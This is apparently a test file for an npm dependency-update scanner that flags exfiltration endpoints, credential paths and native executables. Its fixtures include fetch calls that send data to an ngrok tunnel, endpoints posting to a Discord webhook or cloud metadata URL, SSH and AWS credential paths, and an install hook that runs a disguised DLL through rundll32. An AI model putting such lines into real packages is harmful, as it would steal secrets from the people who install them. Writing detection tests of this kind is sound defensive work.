// Two causes of noise measured on real Dependabot/Renovate update PRs: TypeScript sources that were
// only pattern-scanned (so the whole report said "incomplete"), and a public suffix list whose
// entries (ngrok.io, trycloudflare.com) were reported as a high exfiltration endpoint.
import test from 'node:test';
import assert from 'node:assert/strict';
import { npmSnapshot } from '../src/snapshot.js';
import { diffSnapshots } from '../src/diff.js';
import { NAME_LIST_MIN, TRANSFORM_LIMIT, isHostName, scanJs } from '../src/js-scan.js';

const pkg = (extra = {}) => Buffer.from(JSON.stringify({ name: 't', version: '1.0.0', main: 'index.js', ...extra }));
const files = (entries, extra) => new Map([['package.json', pkg(extra)], ['index.js', Buffer.from('module.exports = 1;')], ...entries.map(([p, s]) => [p, Buffer.from(s)])]);
const diff = async (before, after, extra) => diffSnapshots(await npmSnapshot(files(before, extra)), await npmSnapshot(files(after, extra)));
const sec = (r, kind) => r.findings.filter((f) => f.category === 'security' && f.kind === kind);
const names = (n, extra) => `module.exports = [${[...Array(n - extra.length)].map((_, i) => `'site${i}.example'`).concat(extra.map((x) => `'${x}'`)).join(', ')}];\n`;

test('TypeScript sources are parsed: a new call is found on its line and coverage is complete', async () => {
    const before = 'export function get(u: string): number {\n    return u.length;\n}\n';
    const after = 'import type { Agent } from "http";\nexport async function get(u: string): Promise<number> {\n    const r = await fetch(u);\n    return r.status;\n}\n';
    const r = await diff([['src/get.ts', before]], [['src/get.ts', after]]);
    assert.equal(r.coverage.complete, true);
    assert.deepEqual(r.coverage.unparsedFiles, []);
    const net = sec(r, 'network');
    assert.equal(net.length, 1, JSON.stringify(r.findings));
    assert.deepEqual(net[0].locations, [{ file: 'src/get.ts', line: 3 }]);
    // A type-only import is erased with the types: no "module http" signal from it.
    assert.ok(!r.findings.some((f) => /module http/.test(f.title)));
});

test('TypeScript that needs transform mode (enum) is parsed, but no line is claimed', async () => {
    const after = 'enum Mode { A, B }\nexport const m = Mode.A;\nexport function go(u: string) { return fetch(u); }\n';
    const r = await diff([['src/mode.ts', 'export const m = 1;\n']], [['src/mode.ts', after]]);
    assert.equal(r.coverage.complete, true);
    const net = sec(r, 'network');
    assert.equal(net.length, 1);
    assert.deepEqual(net[0].locations, [{ file: 'src/mode.ts', line: 0 }]);
    assert.equal(scanJs(after, { typescript: true }).parsed, true);
});

test('a large file that only transform mode could convert is pattern-scanned quickly, not transformed', () => {
    const enums = Array.from({ length: 20000 }, (_, i) => `enum E${i} { A, B }`).join('\n') + '\nfetch("https://x.example/");\n';
    assert.ok(enums.length > TRANSFORM_LIMIT);
    const t = Date.now();
    const r = scanJs(enums, { typescript: true });
    assert.ok(Date.now() - t < 1500, `${Date.now() - t} ms`);
    assert.equal(r.parsed, false);
    assert.ok(r.signals.some((x) => x.kind === 'network'));
});

test('TypeScript Node cannot convert stays pattern-scanned and listed, never silently clean', async () => {
    const broken = 'export const a: number = (;\nfetch("https://x.example/")\n';
    const r = await diff([['src/b.ts', 'export const a = 1;\n']], [['src/b.ts', broken]]);
    assert.equal(r.coverage.complete, false);
    assert.match(r.coverage.unparsedFiles.find((f) => f.file === 'src/b.ts').reason, /TypeScript source; pattern scan only/);
    assert.equal(sec(r, 'network').length, 1);
});

test('a tunnel host name that is only an entry of a long list of names is low, not review', async () => {
    const list = names(NAME_LIST_MIN + 20, ['ngrok.io', 'trycloudflare.com']);
    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN + 20, [])]], [['lib/psl.js', list]]);
    const ex = sec(r, 'exfil-endpoint');
    assert.equal(ex.length, 2, JSON.stringify(r.findings));
    for (const f of ex) {
        assert.equal(f.severity, 'low');
        assert.match(f.title, /\(only as an entry in a long list of names\)$/);
    }
    assert.notEqual(r.verdict, 'review');
});

test('the same name stays high in a short list, in install-time code, or when also used outside the list', async () => {
    const short = await diff([['lib/a.js', "module.exports = ['a.example'];\n"]], [['lib/a.js', "module.exports = ['a.example', 'ngrok.io'];\n"]]);
    assert.equal(sec(short, 'exfil-endpoint')[0].severity, 'high');
    assert.equal(short.verdict, 'review');

    const install = { scripts: { postinstall: 'node lib/psl.js' } };
    const inst = await diff([['lib/psl.js', names(NAME_LIST_MIN, [])]], [['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])]], install);
    assert.ok(inst.findings.some((f) => f.kind === 'exfil-endpoint' && f.severity === 'high'), JSON.stringify(inst.findings));

    const used = names(NAME_LIST_MIN, ['ngrok.io']) + "fetch('https://abc.ngrok.io/collect');\n";
    const both = await diff([['lib/psl.js', names(NAME_LIST_MIN, [])]], [['lib/psl.js', used]]);
    assert.equal(sec(both, 'exfil-endpoint')[0].severity, 'high');
    assert.equal(both.verdict, 'review');
});

test('only host names get the list rule: a long list of credential paths is what a stealer reads', async () => {
    const paths = names(NAME_LIST_MIN + 5, ['.ssh/id_rsa', '.aws/credentials']);
    const r = await diff([['lib/p.js', names(NAME_LIST_MIN + 5, [])]], [['lib/p.js', paths]]);
    const cred = sec(r, 'credential-path');
    assert.ok(cred.length >= 1, JSON.stringify(r.findings));
    for (const f of cred) assert.equal(f.severity, 'high');
    assert.equal(r.verdict, 'review');
});

test('a long array that is mostly not strings is not a list of names', async () => {
    const mixed = `module.exports = [${[...Array(NAME_LIST_MIN)].map((_, i) => (i % 2 ? `${i}` : `'s${i}'`)).join(', ')}, 'ngrok.io'];\n`;
    const r = await diff([['lib/m.js', 'module.exports = [];\n']], [['lib/m.js', mixed]]);
    assert.equal(sec(r, 'exfil-endpoint')[0].severity, 'high');
});

// More list entries than the report keeps as locations (50), so an ordinary use comes after the cap.
const repeated = (hits) => `const names = [${[...Array(NAME_LIST_MIN + hits)].map((_, i) => `'${i < hits ? 'ngrok.io' : `site${i}.example`}'`).join(', ')}];\n`;
const use = "fetch('https://abc.ngrok.io/collect');\n";

test('an ordinary use after the reported locations still keeps the name high, in the same file or another', async () => {
    for (const hits of [1, 49, 50, 60]) {
        const r = await diff([['lib/a.js', 'module.exports = [];\n']], [['lib/a.js', repeated(hits) + use]]);
        const ex = sec(r, 'exfil-endpoint');
        assert.equal(ex.length, 1, JSON.stringify(r.findings));
        assert.equal(ex[0].severity, 'high', `${hits} list hits`);
        assert.doesNotMatch(ex[0].title, /long list/);
        assert.equal(r.verdict, 'review');
    }
    const cross = await diff([['lib/names.js', 'module.exports = [];\n']], [['lib/names.js', repeated(60)], ['lib/use.js', use]]);
    assert.equal(sec(cross, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(cross.findings));
    assert.equal(cross.verdict, 'review');
});

test('per-file path: a name new to a changed file stays high when any file uses it outside a list', async () => {
    // Already used in lib/existing.js; lib/a.js gains 60 list entries and an ordinary use after them.
    const r = await diff([['lib/a.js', 'module.exports = [];\n'], ['lib/existing.js', use]], [['lib/a.js', repeated(60) + use], ['lib/existing.js', use]]);
    const ex = sec(r, 'exfil-endpoint');
    assert.equal(ex.length, 1, JSON.stringify(r.findings));
    assert.match(ex[0].title, /^New in `?lib\/a\.js/);
    assert.equal(ex[0].severity, 'high');
    // lib/a.js gains only list entries, but the unchanged lib/existing.js still sends to the name.
    const listOnlyHere = await diff([['lib/a.js', 'module.exports = [];\n'], ['lib/existing.js', use]], [['lib/a.js', repeated(60)], ['lib/existing.js', use]]);
    assert.equal(sec(listOnlyHere, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(listOnlyHere.findings));
});

test('per-file path: a suffix list already in the old version does not excuse a new ordinary use elsewhere', async () => {
    // The shape of a compromised happy-dom: the list was already there, a changed file now sends to a tunnel.
    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/send.js', 'module.exports = 1;\n']],
        [['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/send.js', use]]);
    const ex = sec(r, 'exfil-endpoint');
    assert.equal(ex.length, 1, JSON.stringify(r.findings));
    assert.match(ex[0].title, /^New in `?lib\/send\.js/);
    assert.equal(ex[0].severity, 'high');
    assert.equal(r.verdict, 'review');
});

test('per-file path: a suffix list in a changed file that only gains list entries stays low', async () => {
    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/other.js', names(NAME_LIST_MIN, [])]],
        [['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])], ['lib/other.js', names(NAME_LIST_MIN, ['ngrok.io'])]]);
    const ex = sec(r, 'exfil-endpoint');
    assert.equal(ex.length, 1, JSON.stringify(r.findings));
    assert.match(ex[0].title, /^New in `?lib\/other\.js.*\(only as an entry in a long list of names\)$/);
    assert.equal(ex[0].severity, 'low');
});

test('install-time code keeps the name high however many list entries come first', async () => {
    const install = { scripts: { postinstall: 'node lib/a.js' } };
    for (const hits of [49, 50, 60]) {
        const r = await diff([['lib/a.js', 'module.exports = [];\n']], [['lib/a.js', repeated(hits)]], install);
        assert.ok(r.findings.some((f) => f.kind === 'exfil-endpoint' && f.severity === 'high'), `${hits}: ${JSON.stringify(r.findings)}`);
        assert.equal(r.verdict, 'review');
    }
});

test('a full endpoint URL in a long list is an address, not a name: it stays high', async () => {
    // A list of endpoints the existing code already posts to; only one entry changes.
    const urls = (u) => `const endpoints = [${[...Array(NAME_LIST_MIN)].map((_, i) => JSON.stringify(i ? `https://site${i}.example/` : u)).join(', ')}];\nexport function send(body) { return fetch(endpoints[0], { method: 'POST', body }); }\n`;
    for (const u of ['https://discord.com/api/webhooks/000/synthetic', 'https://metadata.google.internal/computeMetadata/v1/', 'https://abc.ngrok.io/collect', 'https://abc.ngrok.io', 'abc.ngrok.io/collect', 'user@ngrok.io', 'ngrok.io:443']) {
        const r = await diff([['index.js', urls('https://service.example/submit')]], [['index.js', urls(u)]]);
        const ex = sec(r, 'exfil-endpoint');
        assert.equal(ex.length, 1, `${u}: ${JSON.stringify(r.findings)}`);
        assert.equal(ex[0].severity, 'high', u);
        assert.doesNotMatch(ex[0].title, /long list/);
        assert.equal(r.verdict, 'review', u);
        assert.equal(r.coverage.complete, true);
    }
    // One URL among 100 bare names: the names are a list, the URL is still an address.
    const mixed = await diff([['lib/a.js', names(NAME_LIST_MIN + 1, [])]], [['lib/a.js', names(NAME_LIST_MIN + 1, ['https://abc.ngrok.io/collect'])]]);
    assert.equal(sec(mixed, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(mixed.findings));
    // A bare name among 100 URLs: a list of addresses is not a list of names.
    const among = await diff([['index.js', urls('https://service.example/submit')]], [['index.js', urls('https://service.example/submit').replace("'https://site1.example/'", "'ngrok.io'").replace('"https://site1.example/"', '"ngrok.io"')]]);
    assert.equal(sec(among, 'exfil-endpoint')[0].severity, 'high', JSON.stringify(among.findings));
});

test('a public suffix list with wildcard and exception rules is a list of names', async () => {
    const rules = ['*.ck', '!www.ck', 'xn--p1ai', 'ngrok.io', 'trycloudflare.com'];
    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN + 5, [])]], [['lib/psl.js', names(NAME_LIST_MIN + 5, rules)]]);
    const ex = sec(r, 'exfil-endpoint');
    assert.equal(ex.length, 2, JSON.stringify(r.findings));
    for (const f of ex) assert.equal(f.severity, 'low');
    assert.notEqual(r.verdict, 'review');
});

test('only bare host names are list entries', () => {
    for (const s of ['ngrok.io', '*.ck', '!www.ck', 'xn--p1ai', 'metadata.google.internal', 'example.com.']) assert.equal(isHostName(s), true, s);
    for (const s of ['https://abc.ngrok.io/collect', 'https://ngrok.io', '//ngrok.io', 'abc.ngrok.io/x', 'discord.com/api/webhooks', 'user@ngrok.io', 'ngrok.io:443', '169.254.169.254', 'a b.io', '.io', 'a..io', '-a.io', '']) assert.equal(isHostName(s), false, s);
});

// A platform package (@rollup/rollup-linux-x64-gnu) ships one native addon; added to a lockfile, it read "review".
const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(64)]);
const withBin = (p) => new Map([['package.json', pkg()], ['index.js', Buffer.from('module.exports = 1;')], [p, elf]]);

test('a Node addon (.node) is native code, not a new executable', async () => {
    const r = diffSnapshots(await npmSnapshot(files([])), await npmSnapshot(withBin('rollup.linux-x64-gnu.node')));
    assert.equal(sec(r, 'binary-executable').length, 0, JSON.stringify(r.findings));
    assert.equal(sec(r, 'native-code')[0].severity, 'medium');
    const added = diffSnapshots(null, await npmSnapshot(withBin('rollup.linux-x64-gnu.node')), { addedPackage: true });
    assert.notEqual(added.verdict, 'review', JSON.stringify(added.findings));
});

test('a new .wasm, or a .so/.dll that is not an executable image, is still reported as native code', async () => {
    for (const [p, bytes] of [['lib/x.wasm', Buffer.concat([Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]), Buffer.alloc(32)])], ['lib/x.so', Buffer.alloc(64, 1)], ['lib/x.dll', Buffer.alloc(64, 1)]]) {
        const r = diffSnapshots(await npmSnapshot(files([])), await npmSnapshot(new Map([['package.json', pkg()], ['index.js', Buffer.from('module.exports = 1;')], [p, bytes]])));
        assert.equal(sec(r, 'native-code')[0]?.severity, 'medium', p);
    }
});

test('a .dll/.so/.dylib or any other ELF/PE/Mach-O file is still a high "new executable"', async () => {
    // Shaped like the 2025 eslint-config-prettier compromise: node-gyp.dll, an install script runs it.
    const pe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64)]);
    const scav = new Map([['package.json', pkg({ scripts: { install: 'node install.js' } })], ['index.js', Buffer.from('module.exports = 1;')],
        ['install.js', Buffer.from("require('child_process').spawn('rundll32', [__dirname + '/node-gyp.dll,main']);")], ['node-gyp.dll', pe]]);
    const s = diffSnapshots(await npmSnapshot(files([])), await npmSnapshot(scav));
    assert.ok(s.findings.some((f) => f.kind === 'binary-executable' && f.severity === 'high'), JSON.stringify(s.findings));
    for (const p of ['bin/tool', 'lib/addon.so', 'lib/libx.dylib', 'lib/addon.node.bak', 'x.so.1']) {
        const r = diffSnapshots(await npmSnapshot(files([])), await npmSnapshot(withBin(p)));
        assert.equal(sec(r, 'binary-executable')[0]?.severity, 'high', p);
        const added = diffSnapshots(null, await npmSnapshot(withBin(p)), { addedPackage: true });
        assert.equal(added.verdict, 'review', p);
    }
});
